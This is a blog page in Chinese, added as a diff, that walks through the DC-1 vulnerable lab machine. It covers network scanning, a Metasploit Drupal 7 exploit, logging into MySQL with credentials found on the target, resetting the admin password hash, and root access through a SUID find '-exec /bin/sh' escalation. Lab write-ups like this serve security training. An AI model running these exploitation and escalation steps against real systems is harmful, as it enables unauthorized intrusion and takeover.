@@ -1,0 +1,342 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>dc-1 | jujub3</title>
+    <meta name="author" content="jujub3" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/head.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>JUJUB3</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags/THM">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;JUJUB3</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags/THM">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>dc-1</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/4
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/DC/" style="color: #ff7d73">
+                    DC
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><h3 id="收集靶机的mac地址"><a href="#收集靶机的mac地址" class="headerlink" title="收集靶机的mac地址"></a>收集靶机的mac地址</h3><span id="more"></span>
+
+<p>这个就直接在靶机的网络适配器中的高级选项中就可以看见，</p>
+<p><img src="/../dc-1/1731508421109-ece8bc63-cdce-4e65-9cb8-c2e93624ef18.png" alt="img"></p>
+<p>于是得到靶机的mac地址：00:0C:29:FB:D1:43</p>
+<h3 id="目标发现（内网扫描）"><a href="#目标发现（内网扫描）" class="headerlink" title="目标发现（内网扫描）"></a>目标发现（内网扫描）</h3><p>1、使用arp-scan 进行内网扫描</p>
+<p>命令：arp-scan -l</p>
+<p><img src="/../dc-1/1731508598461-eaefc90c-8334-452c-8143-c76c121e3f58.png" alt="img"></p>
+<p>第一个地址是ip地址，第二个地址对应的是mac地址</p>
+<p>于是根据mac地址，找到对应的ip地址：192.168.126.137</p>
+<p>2、使用namp进行内网扫描</p>
+<p>命令：nmap -sP 192.168.126.0&#x2F;24</p>
+<p><img src="/../dc-1/1731508978938-0da399e7-056d-4496-9cde-6ff87d885c33.png" alt="img"></p>
+<p>作用：执行ping扫描，这会检测哪些主机在线，而不会进行端口扫描，在新版本中-sP 已经被 -sn代替，但是他们的功能相同。 这个命令会扫描 <code>192.168.126.0</code> 到 <code>192.168.126.255</code> 范围内的所有 IP 地址  </p>
+<p>3、使用masscan进行内网扫描</p>
+<p>命令：masscan –ping 192.168.126.0&#x2F;24</p>
+<p><img src="/../dc-1/1731509491016-54662ce0-791c-4951-84f8-4f1f9b2da766.png" alt="img"></p>
+<h3 id="发现目标后进行进一步的信息获取："><a href="#发现目标后进行进一步的信息获取：" class="headerlink" title="发现目标后进行进一步的信息获取："></a>发现目标后进行进一步的信息获取：</h3><p>1、使用masscan对目标192.168.126.137进行端口扫描</p>
+<p>命令： masscan 192.168.126.137 -p0-65535 –rate&#x3D;10000 </p>
+<p><img src="/../dc-1/1731509786227-db2a40c1-e997-431d-a2ae-ff050c370bfb.png" alt="img"></p>
+<p>2、使用nmap进行端口扫描</p>
+<p>命令：nmap -sV 192.168.126.137</p>
+<p><img src="/../dc-1/1731509915543-e1ac7fba-d559-4964-bea1-26e61be48a8c.png" alt="img"></p>
+<p>nmap -sV 192.168.126.0&#x2F;24</p>
+<p>也行，这个只不过是对192.168.126.0到192.168.126.255所有的ip地址进行扫描</p>
+<p><img src="/../dc-1/1731509972492-b75d2dd8-eda9-4f92-995a-bc3d7a1b6a14.png" alt="img"></p>
+<p>或者进行更详细的端口信息扫描</p>
+<p>命令：nmap -p 80,111,44077 -A 192.168.126.137</p>
+<p><img src="/../dc-1/1731510199240-55c28ce1-57c8-4143-99bc-39865374de6c.png" alt="img"></p>
+<p>通过这条命令发现，其80端口开放着Drupal 7的http服务，111端口是rpcbind服务</p>
+<p>这里也可以使用whatweb -v  ip       来查找它对应的cms版本	<img src="/../dc-1/1731510782945-c1821673-c51c-4f12-a704-57c630da59fb.png" alt="img"></p>
+<h3 id="通过msfconsole获取flag1"><a href="#通过msfconsole获取flag1" class="headerlink" title="通过msfconsole获取flag1"></a>通过msfconsole获取flag1</h3><p>因为它是开放着的80端口，所以直接访问ip，进入网站，发现是一个登录页面</p>
+<p><img src="/../dc-1/1731510543670-63def8ec-42ae-49eb-8b94-31858cea80cd.png" alt="img"></p>
+<p>因为上面的到他的cms是drupal 7，百度了一下，存在漏洞</p>
+<p><img src="/../dc-1/1731511083657-473e4a52-e8c3-4981-89d7-495a0dd5673f.png" alt="img"></p>
+<p>输入msfconsole，打开msf</p>
+<p>搜索：search Drupal<img src="/../dc-1/1731513543361-449d45c6-d98a-4c44-b1a7-0a4bd2cd6132.png" alt="img"></p>
+<p>可以看到一个2018年的，</p>
+<p>使用第二个漏洞：use 2</p>
+<p>使用show options 查看当前设置好的信息，yes是需要设置的<img src="/../dc-1/1731513848482-9e7a76b2-86cb-4621-b373-6d1156f651cb.png" alt="img"></p>
+<p>把RHOSTS设置成目标ip：set RHOSTS 192.168.126.137</p>
+<p>再次show options，可以看到已经被设置</p>
+<p><img src="/../dc-1/1731513959483-67d61d2b-0359-4108-923f-9f9a073b2aef.png" alt="img"></p>
+<p>输入run，开始攻击</p>
+<p><img src="/../dc-1/1731514076107-47c66978-b962-4d3c-a6f6-1b94acfb67c6.png" alt="img"></p>
+<p>显示meterpreter，攻击成功</p>
+<p>现在就可以执行命令了，拿到第一个flag1<img src="/../dc-1/1731514145392-601d1031-9d12-44a0-bd45-a439cac0f0c8.png" alt="img"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>第一个flag提示我们看配置文件，问一下ai<img src="/../dc-1/1731514738769-91ec8be1-9ec3-426d-81e5-9582eacaa13f.png" alt="img"></p>
+<p>直接cat</p>
+<p><img src="/../dc-1/1731514789722-d0c108c8-e442-417f-8e29-444f81ffdeb0.png" alt="img"></p>
+<p>看到了flag2</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里先通过msf建立一个交互式shell</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p><img src="/../dc-1/1731515108187-9ff21b54-e84c-437c-9a3f-5fc3f97c15e4.png" alt="img"></p>
+<p>通过刚刚拿到的mysql账号跟密码登录mysql</p>
+<p>、命令：mysql -udbuser -pR0ck3t</p>
+<p><img src="/../dc-1/1731515175965-cad97b18-3f5d-47f9-a923-26f4d52cf91e.png" alt="img"></p>
+<p>通过查询数据库，表（users），最后查询到<img src="/../dc-1/1731515302807-393d634a-715b-46a0-be1d-e9adbabc6c79.png" alt="img"></p>
+<p>最后发现有两个用户，一个是admin，一个是fred，密码都是经过hash加密的，所以要先找到加密的脚本</p>
+<p>find &#x2F; -name <em>password</em></p>
+<p><img src="/../dc-1/1731515771491-bea37f8d-6f25-4313-aeb7-7db185706ea3.png" alt="img"></p>
+<p>找到一个&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh，.sh是shell脚本文件，通常可以直接执行</p>
+<p>cat一下，发现是一个php文件</p>
+<p><img src="/../dc-1/1731515892806-7a7f3658-712f-4ee2-8cf3-31b98cc3c911.png" alt="img"></p>
+<p>使用命令生成一个新的hash值</p>
+<p>php .&#x2F;scripts&#x2F;password-hash.sh 123456</p>
+<p><img src="/../dc-1/1731662767225-aeea214a-528a-46f1-bab3-b51b1fad5e06.png" alt="img"></p>
+<p>$S$DhG9D2tbKmohxhcQGSCgrEQV.81ZlX0OsCApH8uyneC4bv&#x2F;5WRfe</p>
+<p>查看当前的用户和密码</p>
+<p><img src="/../dc-1/1731516283605-69bd9a1f-8cf5-4fc6-bfb1-9c7d3a4346ad.png" alt="img"></p>
+<p>然后通过mysql的update命令来更新密码，命令：</p>
+<p>update users set pass&#x3D;”$S$Da4HXFW3Pwd9UaTtSFIgMbQd.AEONzo5vUy0mH05f.PtaSXg7dnZ” where name&#x3D;”admin”;</p>
+<p><img src="/../dc-1/1731662867371-46f332bf-1e72-41cb-a950-2bbe6a6c2a8f.png" alt="img"></p>
+<p>最后成功登录，拿到flag3（在content模块）<img src="/../dc-1/1731662910109-e0ba703a-73cf-4059-82b2-a2e5bbf7f28d.png" alt="img"></p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>现在已经可以执行命令了，当然最重要的就是查看 &#x2F;etc&#x2F;passwd，查看用户和权限</p>
+<p><img src="/../dc-1/1731514250440-540afc8f-1509-4d77-8c77-f07ec0879005.png" alt="img"></p>
+<p>看到有个flag4的用户，然后，直接进入&#x2F;home&#x2F;flag4这个目录，拿到flag4</p>
+<p><img src="/../dc-1/1731663134505-e88d93c5-aff9-49c3-a0c8-d5ed04206be9.png" alt="img"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>由上一个flag4提示，猜测root也有个flag</p>
+<p>需要用到suid提权，利用find命令，查找具有suid权限的可执行二进制文件。</p>
+<p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null	</p>
+<p><img src="/../dc-1/1731663475606-e973d44b-58bf-4376-9683-eaeb4e7862a9.png" alt="img"></p>
+<p>看到一个find，可以执行root权限的命令查找文件，这里find要查找的文件需要是一个存在的文件。所以就用flag1.txt了</p>
+<p>find &#x2F; -name flag1.txt -exec “&#x2F;bin&#x2F;sh” ;</p>
+<p><img src="/../dc-1/1731664338157-8b4341a8-ca30-4fba-8240-8aeba4d0ddbd.png" alt="img"></p>
+<p>然后利用cd &#x2F;root切换到root用户，拿到最后的flag</p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 jujub3
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;jujub3
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="jujub3/jujub3.github.io"
+    data-repo-id="R_kgDOOQ-ONw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOOQ-ON84ComAd"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
